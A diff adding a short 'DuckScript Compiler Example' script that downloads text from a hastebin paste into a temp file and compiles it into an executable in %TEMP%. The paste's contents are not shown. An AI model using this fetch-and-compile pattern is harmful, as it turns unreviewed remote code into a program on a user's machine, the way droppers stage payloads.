@@ -1,0 +1,6 @@
+# DuckScript Compiler Example
+# Author: Zebratic
+# Date: 22/12/2020
+
+"/writetofile" "%TEMP%\lol.txt" "%GETTEXT:https://hastebin.com/raw/yeruxilare%"
+"/compile" "%TEMP%\HelloWorld.exe" "%GETFILE:%TEMP%\lol.txt%"
